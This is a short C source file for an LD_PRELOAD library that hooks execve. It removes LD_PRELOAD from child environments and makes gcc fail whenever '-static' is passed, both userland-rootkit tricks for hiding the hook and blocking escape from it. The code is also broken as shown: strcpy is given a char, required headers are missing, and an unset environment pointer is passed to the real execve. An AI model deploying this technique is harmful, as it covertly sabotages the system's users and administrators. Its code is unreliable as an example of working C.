#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

//grabs the env variables at linking time(?)
extern char **environ;

//sets the old execve
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
char **newenvp;

//used to remove LD_PRELOAD when the library is loaded. We will load it back in 
//at the end.
void init(){
	
	
}

int execve(const char *filename, char *const argv[], char *const envp[]){

	char deflt[] = "LD_PRELOAD=";

	if(!old_execve){
		old_execve = dlsym(RTLD_NEXT,"execve");		
	}


	//remove LD_PRELOAD for enviroment variables
	for(int x = 0; envp[x] != NULL; x++){
		if(strstr(envp[x], "LD_PRELOAD=")){
			strcpy(envp[x], '\0');
		
		}
	}
	
	//breaks static compiling
	if(strstr(filename, "gcc")){
		for(int i =0; argv[i] != NULL; i++){
			if(strstr(argv[i],"-static")){
				errno = ETXBSY;
				return -1;
			}
		}
	}

	return old_execve(filename, argv, newenvp);
}
